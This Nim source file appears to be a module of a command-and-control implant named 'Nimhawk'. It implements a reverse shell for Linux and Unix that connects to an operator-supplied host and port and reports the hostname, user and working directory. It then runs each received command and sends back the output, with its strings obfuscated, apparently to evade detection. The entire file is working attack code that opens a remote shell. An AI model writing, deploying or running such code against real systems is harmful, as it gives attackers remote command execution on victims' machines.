#[
    Cross-Platform reverseShell Command
    Basic reverse shell implementation for Linux/Unix systems
    Adapted from Windows version without advanced encryption
]#

import net, osproc, strutils, os
import ../../util/strenc

proc reverseShell*(args: seq[string]): string =
    try:
        if args.len != 2:
            return obf("ERROR: reverseShell requires exactly two arguments.\nUsage: reverseShell <host> <port>")
        
        let host = args[0]
        let port = parseInt(args[1])
        
        when defined verbose:
            echo obf("DEBUG: Attempting reverse shell to ") & host & ":" & $port
        
        var socket: Socket
        try:
            socket = newSocket()
            socket.connect(host, Port(port))
            
            when defined verbose:
                echo obf("[DEBUG]: Connected to reverse shell handler")
            
            # Send initial banner
            socket.send(obf("Nimhawk Reverse Shell Connected\n"))
            socket.send(obf("OS: ") & when defined(linux): "Linux" 
                                     elif defined(macosx): "macOS" 
                                     else: "Unix" & "\n")
            socket.send(obf("Hostname: ") & execProcess("hostname").strip() & "\n")
            socket.send(obf("User: ") & execProcess("whoami").strip() & "\n")
            socket.send(obf("PWD: ") & getCurrentDir() & "\n")
            socket.send("$ ")
            
            # Main command loop
            var running = true
            while running:
                try:
                    let command = socket.recvLine()
                    
                    if command.strip() == "":
                        continue
                    
                    if command.strip().toLowerAscii() == "exit":
                        socket.send(obf("Goodbye!\n"))
                        running = false
                        break
                    
                    when defined verbose:
                        echo obf("DEBUG: Executing reverse shell command: ") & command
                    
                    # Execute command
                    let (output, exitCode) = execCmdEx(command)
                    
                    # Send output back
                    if output.len > 0:
                        socket.send(output)
                    else:
                        socket.send(obf("(No output)\n"))
                    
                    socket.send("$ ")
                    
                except:
                    # Connection lost or error
                    running = false
                    break
                    
        except Exception as e:
            when defined verbose:
                echo obf("DEBUG: Reverse shell connection failed: ") & e.msg
            return obf("ERROR: Could not connect to ") & host & ":" & $port & " - " & e.msg
        finally:
            try:
                socket.close()
            except:
                discard
        
        when defined verbose:
            echo obf("DEBUG: Reverse shell session ended")
        
        return obf("Reverse shell session completed")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: reverseShell failed: ") & e.msg
        return obf("ERROR: Reverse shell failed - ") & e.msg 